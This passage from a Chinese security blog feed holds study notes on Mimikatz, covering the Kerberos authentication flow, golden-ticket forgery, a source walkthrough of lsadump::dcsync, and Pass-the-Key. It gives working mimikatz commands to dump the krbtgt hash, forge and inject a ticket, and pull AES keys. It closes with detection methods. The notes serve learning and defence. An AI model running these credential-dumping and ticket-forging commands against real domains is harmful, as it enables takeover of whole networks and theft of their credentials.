Server):同于发放认证过程和客户端访问服务端的票据</li></ul></li></ul></li><li><p>Kerberos协议通过引入同时认识客户端(A)和服务端(B)的秘钥分发中心(C)实现身份认证。简化的流程如下：</p><ul><li>第一步：客户端向KDC请求获取访问服务端的服务授予票据</li><li>第二歩：客户端拿着服务授予票据访问服务端</li></ul></li><li><p>上述步骤存在的问题：</p><ul><li>1.KDC如何判断客户端的安全性(真实性)？</li><li>2.服务端如何判断客户端的服务授予票据的真实性？</li></ul></li><li><p>Kerberos认证协议的前提：</p><ul><li>Kerberos存在一个数据库，运维人员会添加可以使用认证服务的人员和网络服务。相当于一个白名单。</li><li>当用户被添加到数据库，会根据当前的密码生成一把秘钥存储在数据库中(很重要)。并且保存用户的基本信息，以供认证。</li><li>只要两两通讯就会进行认证。</li></ul></li><li><p>两个个人理解的概念：机器秘钥(与机器密码强相关的秘钥)，会话秘钥(CT_SK,CS_SK)本次会话中使用的秘钥，会消失。</p></li></ul><h3 id="Kerberos协议第1次通讯"><a href="#Kerberos协议第1次通讯" class="headerlink" title="Kerberos协议第1次通讯"></a>Kerberos协议第1次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端明文向KDC发送请求，该次请求中携带了自己的用户名，主机IP，和当前时间戳</li></ul></li><li><p>KDC行为：</p><ul><li>1.KDC(其中的AS认证服务器)在数据库中比较，是否存在该用户名的用户，<strong>但是不会判断身份的可靠性</strong></li><li>2.如果没有该用户名，认证失败。如果存在，则发送下面两部分数据给客户端<ul><li>TGT(Ticket Granting Ticket即票据授予票据,TGT客户端使用TGT去KDC获取服务授予票据):TGT包含客户端的Name,Ip,时间戳，TGS_Name，TGT的有效时间，以及<strong>一把客户端和TGS通讯的CT_SK(Client And TGS Session Key CT_SK)</strong>。TGT使用TGS的秘钥进行加密(客户端无法解密)，并且秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li><li>将CT_SK,TGS_Name,TGT的有效时间，当前时间戳等数据使用<strong>客户端的秘钥(保存在数据库中)</strong>加密的数据。该秘钥并没有在网络上传播(不存在在线盗取秘钥)。</li></ul></li></ul></li><li><p>总结：KDC总是会传递两部分数据，一部分是客户端能解密的数据(KDC存在客户端秘钥)，第二部分是客户端不能解密的数据(使用TGS秘钥)，<strong>重点是将使用客户端秘钥加密过的CT_SK传递给客户端，避免CT_SK中间被窃取，因为非法的客户端不存在真实的客户端秘钥！这样就实现了CT_SK的传递</strong>。</p></li><li>备注：<strong>凭据信息(TGT,ST)是由和机器密码强相关的秘钥进行加密，主机秘钥在网络中不传递。由来校验加密数据的端点信息和凭据中的端点信息。第一次通讯主要有两个目的，第一，验证客户端是否存在，第二，传递CT_KS会话秘钥。</strong></li></ul><h3 id="Kerberos协议第2次通讯"><a href="#Kerberos协议第2次通讯" class="headerlink" title="Kerberos协议第2次通讯"></a>Kerberos协议第2次通讯</h3><ul><li>客户端行为：<ul><li>1.客户端接收上述KDC发送的TGT和加密数据，利用自己的秘钥解密加密数据，<strong>并获取CT_SK会话秘钥</strong>。如果获取的时间戳和自己发送的时间戳差值大于5mins，则认证结束。否则客户端向TGS发送请求。</li><li>2.利用接收到的CT_SK(Session Key)加密自身的客户端信息，包括客户端名，ip，时间戳。</li><li>3.客户端向KDC发送要访问的服务端的明文信息。</li><li>4.客户端向KDC发送没改变的TGT。</li></ul></li><li><p>TGS行为：</p><ul><li>1.TGS验证客户端明文发送的服务端信息,如果不存在，则认证结束。</li><li>2.TGS利用自身的秘钥解密TGT，得到时间戳和CT_SK,如果时间超过5mins，则认证结束。</li><li>3.使用CT_SK解密客户端发送的客户端信息，比较这个客户端信息和TGT里面的客户端信息进行比对。如果不同则，认证结束。</li><li>4.KDC发送响应内容给客户端：<ul><li>服务端秘钥加密的Ticket(ST),内容包括：客户端信息，Serivce IP，ST的有效时间，时间戳，以及客户端服务端通信的CS_SK</li><li>使用CT_SK加密的内容，其中包括CS_SK，时间戳,ST的有效期。此时客户端已经使用自身的秘钥解密的第一次通讯接收的第二部分数据，获取了CT_SK，<strong>并进行了缓存</strong>。</li></ul></li></ul></li><li><p>总结：本次通讯，有三个目的，第一：客户端会发送服务端信息以让TGS确认<strong>是否存在服务端</strong>，以及CT_SK加密之后的客户端信息和TGT，以让TGS比较两个数据中保存的<strong>客户端信息是否相同</strong>。并<strong>传递ST和包含CS_SK会话秘钥</strong>的加密数据。</p></li><li>备注：<strong>每一次通讯，KDC都会把下一次通讯所需要的会话秘钥传递给客户端。并且客户端每次都会发送两次包含自身数据的报文给校验者从而校验自身，其中TGT和ST的机器秘钥(TGS和服务端机器秘钥)都不经过传递，保证安全性。</strong></li></ul><h3 id="Kerberos协议第3次通讯"><a href="#Kerberos协议第3次通讯" class="headerlink" title="Kerberos协议第3次通讯"></a>Kerberos协议第3次通讯</h3><ul><li>客户端行为<ul><li>1.客户端收到KDC的响应，解密有CT_SK加密的第二部分数据，确认无误后，<strong>并获取CS_SK会话秘钥</strong>继续。</li><li>2.客户端使用CS_SK将自己主机信息和时间戳加密发送给服务端</li><li>3.客户端将第二次通讯获得的服务端凭证ST发送给服务端</li></ul></li><li><p>服务端行为</p><ul><li>1.服务端接收到客户端发来的两部分数据后，服务端使用服务端秘钥解密ST，校验时间戳。</li><li>2.使用CS_SK解密客户端发来的第一部分数据，得到TGS认证过的客户端信息。然后对比这部分数据的客户端信息和经过服务端秘钥加密的ST的客户端信息，判断客户端的合理性。</li><li>3.服务端返回的CT_SK加密的数据，以是的客户端确认服务端身份。就此，Kerberos认证完成。</li></ul></li><li><p>总结：第三次通讯，服务端利用自身的秘钥解密ST，获取其中的客户端信息，然后<strong>比较客户端发来的客户端信息</strong>。从而客户端的合理性。</p></li></ul><p>Ref:<a href="https://seevae.github.io/2020/09/12/详解kerberos认证流程/" target="_blank" rel="external">详解kerberos认证流程</a></p><h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><ul><li>Ptt主要在域内进行横向移动的技术。</li></ul><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul><li>特点：有效时间长(默认是十年)，不会因为密码的修改导致票据的失效，用户名可以是任意的虚拟的。</li><li><p>制作黄金票据的前提：</p><ul><li>域名称</li><li>SID</li><li>域的kbrtgt的Hash(要求短暂的拿到域控服务器的控制权)</li><li>任意用户名</li></ul></li><li><p>在域控服务器中(备注，也可以不登录域控即可获取<a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">https://www.freebuf.com/articles/network/286137.html</a>)，使用<code>mimikatz.exe &quot;lsadump::dcsync /domain:corp.hacky.ren /user:krbtgt&quot; &gt;&gt; golden.txt</code>,可以得到SID以及kbrtgt的Hash，以及域名称。<br>  <img src="http://hacky.wang/blog/20220224/v1o2BzRHGqRi.png?imageslim" alt="mark"></p></li><li><p>在非域控主机中，使用<code>mimikatz.exe &quot;kerberos::golden /admin:hacky /domain:corp.hacky.ren /sid:S-1-5-21-442036050-123597327-3835497791 kbrgtg:ac9a6f3e6ea0f74274725c39179f44a1 /ptt&quot;</code>生成黄金票据，并将其导入内存。</p><ul><li>/admin参数：表示任意伪造的用户名(最好改为受控的主机名，因为部分安全产品是通过检索登录的域账户是否存在而检测PtT)</li><li>/sid:sid数值，取最后一个“-”之前的内容</li><li>/ptt:直接导入内存，这样就不需要使用”kerberos::ptt导入了”<br><img src="http://hacky.wang/blog/20220224/IlxDKwvIESBp.png?imageslim" alt="mark"></li></ul></li><li><p>使用<code>klist</code>或者<code>kerberos::list</code>查看伪造的金票是否被导入。<br>  <img src="http://hacky.wang/blog/20220224/qYBfHpfYehbB.png?imageslim" alt="mark"></p></li><li><p>修改域控服务器密码为abcd.123，然后在远程登录域控，测试金票是否有效。<br>  <img src="http://hacky.wang/blog/20220224/cgK4nT1YidQt.png?imageslim" alt="mark"></p></li><li><p>Ref:</p><ul><li><a href="https://www.freebuf.com/articles/network/286137.html" target="_blank" rel="external">内网渗透测试：DCSync 攻击技术的利用</a></li><li><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/" target="_blank" rel="external">浅析黄金票据与白银票据</a></li></ul></li></ul><h3 id="lsadump-dcsync-源码分析"><a href="#lsadump-dcsync-源码分析" class="headerlink" title="lsadump::dcsync 源码分析"></a>lsadump::dcsync 源码分析</h3><ul><li><p>原理：不同的域控制器(DC)会进行数据同步复制，mimikatz通过模拟一个域控制器，通过GetNCChanges函数向真实的域控制器发送数据同步复制请求，获取控制器指定的用户的口令Hash。dcsync的主要特点是不需要登录域控服务器而获取用户口令HASH。需要注意的是，DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC是不能参与复制同步数据。</p></li><li><p>lsadump::dcsync命令源码位于<code>\mimikatz\modules\lsadump\kuhl_m_lsadump_dc.c</code>中的<code>NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])</code>函数中。</p></li><li><p>首先，通过<code>kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &amp;szTmpDc)</code>寻找域内的域控服务器，其本质会调用<code>DsGetDcName</code>API函数。</p></li><li><p>然后，通过<code>IDL_DRSGetNCChanges</code>函数，向真实域控服务器发送请求，以获取用户信息。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RtlZeroMemory(<span class="name">&amp;getChRep</span>, sizeof(<span class="name">DRS_MSG_GETCHGREPLY</span>))<span class="comment">;</span></div><div class="line">drsStatus = IDL_DRSGetNCChanges(<span class="name">hDrs</span>, <span class="number">8</span>, <span class="symbol">&amp;getChReq</span>, <span class="symbol">&amp;dwOutVersion</span>, <span class="symbol">&amp;getChRep</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></li><li><p>几个重要的结构体</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY</span>:用于接收<span class="type">IDL_DRSGetNCChanges</span>传来的响应消息</div><div class="line">typedef union _DRS_MSG_GETCHGREPLY &#123;</div><div class="line"><span class="type">DRS_MSG_GETCHGREPLY_V6</span> <span class="type">V6</span>;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY</span>;</div><div class="line">//////</div><div class="line">//<span class="type">DRS_MSG_GETCHGREPLY_V6</span>表示<span class="type">DRS_MSG_GETCHGREPLY</span>的第六个版本</div><div class="line">typedef struct _DRS_MSG_GETCHGREPLY_V6 &#123;</div><div class="line"><span class="type">UUID</span> uuidDsaObjSrc;</div><div class="line"><span class="type">UUID</span> uuidInvocIdSrc;</div><div class="line"><span class="type">DSNAME</span> *pNC;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecFrom;</div><div class="line"><span class="type">USN_VECTOR</span> usnvecTo;</div><div class="line"><span class="type">UPTODATE_VECTOR_V2_EXT</span> *pUpToDateVecSrc;</div><div class="line"><span class="type">SCHEMA_PREFIX_TABLE</span> <span class="type">PrefixTableSrc</span>;</div><div class="line"><span class="type">ULONG</span> ulExtendedRet;</div><div class="line"><span class="type">ULONG</span> cNumObjects;</div><div class="line"><span class="type">ULONG</span> cNumBytes;</div><div class="line"><span class="type">REPLENTINFLIST</span> *pObjects;</div><div class="line"><span class="type">BOOL</span> fMoreData;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeObjects;</div><div class="line"><span class="type">ULONG</span> cNumNcSizeValues;</div><div class="line"><span class="type">DWORD</span> cNumValues;</div><div class="line"><span class="type">REPLVALINF_V1</span> *rgValues;</div><div class="line"><span class="type">DWORD</span> dwDRSError;</div><div class="line">&#125; <span class="type">DRS_MSG_GETCHGREPLY_V6</span>;</div><div class="line">/////////</div><div class="line">//<span class="type">PrefixTableSrc</span>定义了从<span class="type">OID</span>到<span class="type">ATTRTYP</span>值的映射表</div><div class="line">typedef struct _SCHEMA_PREFIX_TABLE &#123;</div><div class="line"><span class="type">DWORD</span> <span class="type">PrefixCount</span>;   //<span class="type">PrefixTableEntry</span>的数量</div><div class="line"><span class="type">PrefixTableEntry</span> *pPrefixEntry; //包含了<span class="type">PrefixTableEntry</span>的数组</div><div class="line">&#125; <span class="type">SCHEMA_PREFIX_TABLE</span>;</div><div class="line">////</div><div class="line">//<span class="type">REPLENTINFLIST</span>包含了给定对象(<span class="type">Object</span>)的一个或多个属性</div><div class="line"> typedef struct <span class="type">REPLENTINFLIST</span> &#123;</div><div class="line">   struct <span class="type">REPLENTINFLIST</span>* pNextEntInf;</div><div class="line">   <span class="type">ENTINF</span> <span class="type">Entinf</span>;</div><div class="line">   <span class="type">BOOL</span> fIsNCPrefix;</div><div class="line">   <span class="type">UUID</span>* pParentGuid;</div><div class="line">   <span class="type">PROPERTY_META_DATA_EXT_VECTOR</span>* pMetaDataExt;</div><div class="line"> &#125; <span class="type">REPLENTINFLIST</span>;</div><div class="line">/////</div><div class="line">//<span class="type">AttrBlock</span> 简单的理解为属性块</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject()函数解析/描述对象，其函数原型如下,其中第一个参数prefixTable和第二个参数attributes分别表示OID和ATTRTYP的映射表，AttrBlock表示一个属性块。其最终会返回一个<code>ATTRVALBLOCK</code>结构</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void kuhl_m_lsadump_dcsync_descrObject(<span class="keyword">SCHEMA_PREFIX_TABLE </span>*<span class="keyword">prefixTable, </span></div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCWSTR szSrcDomain, </div><div class="line"><span class="keyword">BOOL </span>someExport, </div><div class="line">ATTRTYP *pSuppATT_IntId, </div><div class="line">DWORD cSuppATT_IntId)</div></pre></td></tr></table></figure></li><li><p>kuhl_m_lsadump_dcsync_descrObject最终会调用kull_m_rpc_drsr_findMonoAttr用户获取指定OID对应的属性值，其中最最最重要的是<code>kull_m_rpc_drsr_findAttr</code>函数，其函数原型如下。其会调用<code>kull_m_rpc_drsr_MakeAttid</code>函数，通过传入的OID生成一个ATTRTYP结构。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttr(</div><div class="line">SCHEMA_PREFIX_TABLE *prefixTable, </div><div class="line">ATTRBLOCK *attributes, </div><div class="line">LPCSTR szOid)</div></pre></td></tr></table></figure></li><li><p>kull_m_rpc_drsr_MakeAttid函数源码如下,很显然，kull_m_rpc_drsr_MakeAttid()首先会截取OID的最后一个数字，接着调用kull_m_rpc_drsr_MakeAttid_addPrefixToTable()取ndx。然后将取到的ndx左移16位，再或运算之后，得到ATTRTYP，这其实是一个ULONG类型。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> kull_m_rpc_drsr_MakeAttid(SCHEMA_PREFIX_TABLE *prefixTable, LPCSTR szOid, ATTRTYP *att, <span class="built_in">BOOL</span> toAdd)</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> status = <span class="literal">FALSE</span>;</div><div class="line">DWORD lastValue, ndx;</div><div class="line">PSTR lastValueString;</div><div class="line">OssEncodedOID oidPrefix;</div><div class="line"><span class="keyword">if</span>(lastValueString = strrchr(szOid, <span class="string">'.'</span>))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(*(lastValueString + <span class="number">1</span>))</div><div class="line">&#123;</div><div class="line">lastValueString++;</div><div class="line">lastValue = strtoul(lastValueString, <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">*att = (WORD) lastValue % <span class="number">0x4000</span>;</div><div class="line"><span class="keyword">if</span>(*att &gt;= <span class="number">0x4000</span>)</div><div class="line">*att += <span class="number">0x8000</span>;</div><div class="line"><span class="keyword">if</span>(kull_m_asn1_DotVal2Eoid(szOid, &amp;oidPrefix))</div><div class="line">&#123;</div><div class="line">oidPrefix.length -= (lastValue &lt; <span class="number">0x80</span>) ? <span class="number">1</span> : <span class="number">2</span>;</div><div class="line"><span class="keyword">if</span>(status = kull_m_rpc_drsr_MakeAttid_addPrefixToTable(prefixTable, &amp;oidPrefix, &amp;ndx, toAdd))</div><div class="line">&#123;</div><div class="line">*att |= ndx &lt;&lt; <span class="number">16</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> PRINT_ERROR(L<span class="string">"kull_m_rpc_drsr_MakeAttid_addPrefixToTable\n"</span>);</div><div class="line">kull_m_asn1_freeEnc(oidPrefix.value);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> status;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>然后通过kull_m_rpc_drsr_findAttrNoOID()遍历整个ATTRBLOCK,ATTRBLOCK结构如下，包含了一个Count表示，ATTR列表的个数，ATTR为一个列表。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _ATTRBLOCK &#123;</div><div class="line">ULONG attrCount;</div><div class="line">ATTR *pAttr;</div><div class="line">&#125; ATTRBLOCK;</div><div class="line">/<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/</span></div><div class="line"><span class="regexp">/</span><span class="regexp">//</span>函数实现如下：</div><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type)</div><div class="line">&#123;</div><div class="line">ATTRVALBLOCK *ptr = NULL;</div><div class="line">DWORD i;</div><div class="line">ATTR *attribut;</div><div class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; attributes-&gt;attrCount; i++)</div><div class="line">&#123;</div><div class="line">attribut = &amp;attributes-&gt;pAttr[i];</div><div class="line">if(attribut-&gt;attrTyp == type)</div><div class="line">&#123;</div><div class="line">ptr = &amp;attribut-&gt;AttrVal;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>最后，就可以根据ATTRVALBLOCK结构，得到具体的属性值。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="title">typedef</span> struct _ATTRVAL &#123;</div><div class="line"><span class="type">ULONG</span> valLen;</div><div class="line"><span class="type">UCHAR</span> *pVal;</div><div class="line">&#125; <span class="type">ATTRVAL</span>;</div><div class="line"><span class="title">typedef</span> struct _ATTRVALBLOCK &#123;</div><div class="line"><span class="type">ULONG</span> valCount;</div><div class="line"><span class="type">ATTRVAL</span> *pAVal;</div><div class="line">&#125; <span class="type">ATTRVALBLOCK</span>;</div><div class="line">/////函数实现</div><div class="line"><span class="type">PVOID</span> kull_m_rpc_drsr_findMonoAttr(<span class="type">SCHEMA_PREFIX_TABLE</span> *prefixTable, <span class="type">ATTRBLOCK</span> *attributes, <span class="type">LPCSTR</span> szOid, <span class="type">PVOID</span> <span class="class"><span class="keyword">data</span>, <span class="type">DWORD</span> *size)</span></div><div class="line">&#123;</div><div class="line"><span class="type">PVOID</span> ptr = <span class="type">NULL</span>;</div><div class="line"><span class="type">ATTRVALBLOCK</span> *valblock;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = <span class="type">NULL</span>;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span>(valblock = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOid))  //得到据<span class="type">ATTRVALBLOCK</span>结构</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span>(valblock-&gt;valCount == <span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">ptr = valblock-&gt;pAVal[<span class="number">0</span>].pVal;</div><div class="line"><span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = ptr;</span></div><div class="line"><span class="keyword">if</span>(size)</div><div class="line">*size = valblock-&gt;pAVal[<span class="number">0</span>].valLen;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">return ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>SID和NTLM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_objectSid, &amp;data, NULL))</div><div class="line">&#123;</div><div class="line">kprintf(L<span class="string">"Object Security ID   : "</span>)<span class="comment">;</span></div><div class="line">kull_m_string_displaySID(data)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\n"</span>)<span class="comment">;</span></div><div class="line">rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - <span class="number">1</span>)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"Object Relative ID   : %u\n"</span>, rid)<span class="comment">;</span></div><div class="line">kprintf(L<span class="string">"\nCredentials:\n"</span>)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_unicodePwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"NTLM"</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_ntPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"ntlm"</span>, TRUE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_dBCSPwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"LM  "</span>, FALSE)<span class="comment">;</span></div><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_lmPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"lm  "</span>, TRUE)<span class="comment">;</span></div></pre></td></tr></table></figure></li></ul><h3 id="kerberos-golden-源码分析"><a href="#kerberos-golden-源码分析" class="headerlink" title="kerberos::golden 源码分析"></a>kerberos::golden 源码分析</h3><ul><li><a href="https://www.anquanke.com/post/id/257703" target="_blank" rel="external">mimikatz源码学习-Kerberos模块</a></li><li><a href="http://evilash.me/2021/12/24/Analyse-NoPac.html" target="_blank" rel="external">解析CVE-2021-42278和CVE-2021-42287</a>主要学习PAC结构</li></ul><h3 id="Pass-The-Ticket-检测"><a href="#Pass-The-Ticket-检测" class="headerlink" title="Pass The Ticket 检测"></a>Pass The Ticket 检测</h3><ul><li>在域控侧</li><li>1.在前期(也就是lsadump::dcsync)，通过检测流量定位DsGetNcChanges流量，判断来源IP是否是已知的域控ip地址。</li><li>2.在中期(也就是kerseros::ptt命令），通过检测流量，寻找在通讯流量中，缺省Kerberos通讯过程中第二第二步。因为黄金票据是伪造TGT的，自然不会有TGT请求的流量。</li><li>3.在后期，通过获取windows 事件，寻找关键的日志ID，进行分析<ul><li>3.1 寻找关键的ID(例如4769)</li><li>3.2 ID为4769的Kerberos登录事件中，登录的账户不在域中，说明是伪造的！因为这个账户可以是任意的<br>在非域控侧<br>1.检测mimikatz工具(有特征，例如yara，或者命令行)</li></ul></li></ul><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><h3 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h3><ul><li>又称为OverPass-The-Hash，因为在安装了KB2871997补丁的系统中，常规的非Administator账户是无法使用PtH进行横向传播的，但是可以使用AES进行Pth。</li><li>mimikatz “privilege::debug” “sekurlsa::ekeys” 获取想要的AES Hash</li><li>mimikatz sekurlsa::pth 进行PtK攻击</li></ul><h2 id="mimikatz检测与防御"><a href="#mimikatz检测与防御" class="headerlink" title="mimikatz检测与防御"></a>mimikatz检测与防御</h2><ul><li>yara检测:<a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar</a>,原理是检测LogonSessionList全局变量的特征码。</li></ul><h2 id="lsadump-sam-源码分析"><a href="#lsadump-sam-源码分析" class="headerlink" title="lsadump::sam 源码分析"></a>lsadump::sam 源码分析</h2><ul><li>Ref<a href="https://zhuanlan.zhihu.com/p/34991269" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/34991269</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这是学习Mimikatz工作原理的无总结笔记。主要包含了&lt;code&gt;sekurlsa::msv&lt;/code&gt;,&lt;code&gt;sekurlsa::pth&lt;/code&gt;,&lt;code&gt;lsadump::dcsync&lt;/code&gt;,票据传递等功能的原理分析和检测。
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.4.9-4.15）学习</title>
    <link href="https://findream.github.io/2022/04/20/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.9-4.15%EF%BC%89/"/>
    <id>https://findream.github.io/2022/04/20/绿盟科技-每周蓝军技术推送（2022.4.9-4.15）/</id>
    <published>2022-04-20T06:02:11.000Z</published>
    <updated>2022-05-23T11:44:50.895Z</updated>
    
